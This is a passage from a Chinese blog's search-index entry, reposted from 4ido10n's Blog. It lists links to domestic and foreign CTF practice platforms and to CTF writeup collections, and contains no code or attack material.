<li><a href="http://hackinglab.cn/" target="_blank" rel="noopener">网络信息安全攻防学习平台</a></li>
<li><a href="http://captf.com/" target="_blank" rel="noopener">CTF题目</a></li>
<li><a href="http://cafebabe.cc/nazo/" target="_blank" rel="noopener">脑洞开发</a></li>
<li><a href="http://1111.segmentfault.com/" target="_blank" rel="noopener">光棍节程序员闯关秀</a></li>
<li><a href="http://www.helloisa.com/test/" target="_blank" rel="noopener">ISA Test</a></li>
<li><a href="http://www.fj543.com/hack/" target="_blank" rel="noopener">黑客丛林之旅</a></li>
<li><a href="http://monyer.com/game/game1/" target="_blank" rel="noopener">梦之光芒小游戏</a></li>
<li><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">XCTF_OJ练习平台</a></li>
<li><a href="http://hackgame.blackbap.org/" target="_blank" rel="noopener">习科黑客游戏</a></li>
<li><a href="http://ctf.3sec.cn/" target="_blank" rel="noopener">Jlu.CTF</a></li>
<li><a href="http://www.baimaoxueyuan.com/ctf" target="_blank" rel="noopener">白帽学院CTF挑战赛</a></li>
<li><a href="http://www.ichunqiu.com/tiaozhans" target="_blank" rel="noopener">i春秋CTF挑战</a></li>
<li><a href="http://ctf.idf.cn/" target="_blank" rel="noopener">idf 实验室</a></li>
<li><a href="http://ctf.moonsos.com/pentest/index.php" target="_blank" rel="noopener">米安CTF</a></li>
<li><a href="http://www.hetianlab.com/CTFrace.html" target="_blank" rel="noopener">合天CTF</a></li>
<li><a href="http://www.shiyanbar.com/ctf/index" target="_blank" rel="noopener">西普CTF</a></li>
<li><a href="http://hkyx.myhack58.com/" target="_blank" rel="noopener">红客闯关游戏</a></li>
<li><a href="http://202.108.211.5/" target="_blank" rel="noopener">实训竞赛系统</a></li>
<li><p><a href="http://ctf.nuptsast.com/" target="_blank" rel="noopener">南邮CTF</a></p>
</li>
<li><p><strong>国外综合练习:</strong></p>
</li>
<li><a href="http://www.wechall.net/" target="_blank" rel="noopener">wechall</a></li>
<li><a href="http://insight-labs.org/" target="_blank" rel="noopener">insight-labs</a></li>
<li><a href="http://webhacking.kr/" target="_blank" rel="noopener">webhacking</a></li>
<li><a href="http://wargame.kr/" target="_blank" rel="noopener">wargame</a></li>
<li><a href="http://canyouhack.it/" target="_blank" rel="noopener">canyouhack</a></li>
<li><a href="http://hackit.sinaapp.com/" target="_blank" rel="noopener">hackit</a></li>
<li><a href="http://webhacking.kr/" target="_blank" rel="noopener">webhacking</a></li>
<li><a href="http://fun.coolshell.cn/" target="_blank" rel="noopener">coolshell</a></li>
<li><a href="http://ringzer0team.com/challenge" target="_blank" rel="noopener">ringzer0team</a></li>
<li><a href="https://backdoor.sdslabs.co/" target="_blank" rel="noopener">backdoor</a></li>
<li><a href="http://smashthestack.org/" target="_blank" rel="noopener">smashthestack</a></li>
<li><a href="http://overthewire.org/wargames/" target="_blank" rel="noopener">overthewire</a></li>
<li><a href="https://w3challs.com/" target="_blank" rel="noopener">w3challs</a></li>
<li><a href="https://chall.stypr.com/?chall" target="_blank" rel="noopener">chall.stypr</a></li>
<li><a href="https://pentesterlab.com/" target="_blank" rel="noopener">pentesterlab</a></li>
<li><a href="https://id0-rsa.pub" target="_blank" rel="noopener">id0-rsa</a></li>
</ul>
<p><strong>0x03 CTF-writeup(WP):</strong></p>
<ul>
<li><strong>各种搜索:ctf writeup</strong></li>
<li><a href="http://drops.wooyun.org/?s=writeup&amp;submit=%E6%90%9C%E7%B4%A2" target="_blank" rel="noopener">乌云WP</a></li>
<li><a href="http://bobao.360.cn/ctf/" target="_blank" rel="noopener">360安全播报WP</a></li>
<li><a href="https://github.com/ctfs/" target="_blank" rel="noopener">github WP</a></li>
<li><a href="http://sec.yka.me/" target="_blank" rel="noopener">CTF Writeup Summary</a></li>
<li><a href="https://ctf-team.vulnhub.com/" target="_blank" rel="noopener">Write Ups</a></li>
</ul>
<p><strong>0x04 后话</strong></p>
<ul>
<li><p>学习的地方很多，不能一一列举，一些其他优秀的平台没有提到，欢迎大家补充</p>
</li>
<li><p>转载自<a href="https://www.hackfun.org/" target="_blank" rel="noopener">4ido10n’s Blog</a>文章<a href="https://www.hackfun.org/CTF/ctf-website.html" target="_blank" rel="noopener">《入CTF坑必不可少的地方-保持更新》</a></p>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
  
  
</search>
